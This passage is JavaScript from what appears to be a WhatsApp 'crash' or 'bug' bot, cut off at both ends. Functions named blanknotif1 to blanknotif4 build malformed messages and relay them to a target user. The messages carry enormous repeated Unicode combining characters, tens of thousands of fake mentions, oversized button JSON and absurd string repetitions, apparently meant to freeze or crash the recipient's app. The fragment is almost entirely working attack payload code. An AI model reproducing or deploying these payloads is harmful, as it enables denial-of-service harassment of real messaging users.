            jpegThumbnail: null
          },
          hasMediaAttachment: true
        },
        body: {
          text: "Marga #6VX Neverdiee!!" + "ꦽ".repeat(30000)
        },
        nativeFlowMessage: {
          messageParamsJson: "{}", 
          buttons: [
            {
              name: "payment_method",
              buttonParamsJson: `{\"reference_id\":null,\"payment_method\":${"\u0010".repeat(999999999999999)},\"payment_timestamp\":null,\"share_payment_status\":true}`,
            },
            {
              name: "payment_method",
              buttonParamsJson: "{}",
            },
            {
              name: "payment_info",
              buttonParamsJson: "{}"
            },
            {
              name: "payment_settings",
              buttonParamsJson: "{}"
            },
            {
              name: "review_and_pay",
              buttonParamsJson: "{}"          
            },
          ]
        }
      });
    }

    const message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [ target, ...Array.from({ length: 35000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`) ],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: target
              },
              participant: target,
              quotedMessage: {
                viewOnceMessage: {
                  message: {
                    interactiveResponseMessage: {
                      body: {
                        text: "Marga #6VX Neverdiee!!".repeat(1000),
                        format: "DEFAULT"
                      },
                      nativeFlowResponseMessage: {
                        name: "galaxy_message",
                        paramsJson: "\n".repeat(10000),
                        version: 3
                      }
                    }
                  }
                }
              }
            },
            body: {
              text: "ꦽ".repeat(30000)
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(50000)
            },
            carouselMessage: {
              cards: cards
            }
          }
        }
      }
    };

    await sock.relayMessage(target, message, {
      messageId: undefined,
      participant: { jid: target }
    });
  } catch (err) {
    console.log(err);
  }
}

//

async function blanknotif1(sock, target) {
  const msg = {
    newsletterAdminInviteMessage: {
      newsletterJid: "120363330289360382@newsletter",
      newsletterName: "Marga #6VX Neverdiee!!" + ":҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉".repeat(20000),
      caption: "Marga #6VX Neverdiee!!" + ":҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉".repeat(20000),
      inviteExpiration: "999999999",
    },
  };

  await sock.relayMessage(target, msg, {
    participant: { jid: target },
    messageId: null,
  });
}

async function blanknotif2(sock, target) {
  try {
  const payload = {
    ephemeralMessage: {
        message: {
          locationMessage: {
            degreesLatitude: -9.09999262999,
            degreesLongitude: 199.99963118999,
            jpegThumbnail: null,
            name: "Marga #6VX Neverdiee!!" + "ꦽ".repeat(45000),
            address: "\u0000",
            url: "https://sock." + "؂ن؃".repeat(100000) + ".com",
            contextInfo: {
              externalAdReply: {
                quotedAd: {
                  advertiserName: " ؂ن؃".repeat(10000),
                  mediaType: "IMAGE",
                  jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
                  caption: "Marga #6VX Neverdiee!!",
                },
                placeholderKey: {
                  remoteJid: "0@s.whatsapp.net",
                  fromMe: false,
                  id: "ABCDEF1234567890",
                },
              },
              quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 3,
                  expiryTimestamp: Date.now() + 1814400000,
                },
                forwardedAiBotMessageInfo: {
                  botName: "META AI",
                  botJid:
                    Math.floor(Math.random() * 5000000) +
                    "@s.whatsapp.net",
                  creatorName: "\n",
                },
              },
            },
          },
        },
      },
  };

  const message = await (async () => {
    try {
      return generateWAMessageFromContent(target,
        payload,
        {}
      );
    } catch (e) {
      console.error(e);
    }
  })();

  if (message) {
    await sock.relayMessage(target,
      message.message,
      { messageId: message.key.id }
    );
  }
} catch (e) {
    console.error(e);
  }
}

async function blanknotif3(sock, target) {
  const VaelMsg = {
    interactiveMessage: {
      header: {
        hasMediaAttachment: false,
        title: "Marga #6VX Neverdiee!!".repeat(1000)
      },
      body: { text: "\x10" },
      footer: { text: "\x10" },
      nativeFlowMessage: {
        buttons: [
          {
            name: "quick_reply",
            buttonParamsJson: JSON.stringify({
              display_text: "𑜦𑜠".repeat(10000),
              id: null
            })
          },
          {
            name: "quick_reply",
            buttonParamsJson: JSON.stringify({
              display_text: "𑜦𑜠".repeat(10000),
              id: null
            })
          },
          {
            name: "cta_url",
            buttonParamsJson: JSON.stringify({
              display_text: "𑜦𑜠".repeat(10000),
              url: "https://"+"𑜦𑜠".repeat(10000)+".com"
            })
          },
          {
            name: "cta_copy",
            buttonParamsJson: JSON.stringify({
              display_text: "𑜦𑜠".repeat(10000),
              copy_code: "𑜦𑜠".repeat(10000)
            })
          }
        ],
        messageParamsJson: JSON.stringify({})
      }
    }
  };
  try {
    await sock.sendMessage(target, VaelMsg);
  } catch (err) {
  }
}

async function blanknotif4(sock, target) {
  const msg = {
    groupInviteMessage: {
      groupJid: "120363418749199341@g.us",
      inviteCode: "974197419741",
      inviteExpiration: "97419741",
      groupName: "Marga #6VX Neverdiee!!" + ":҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉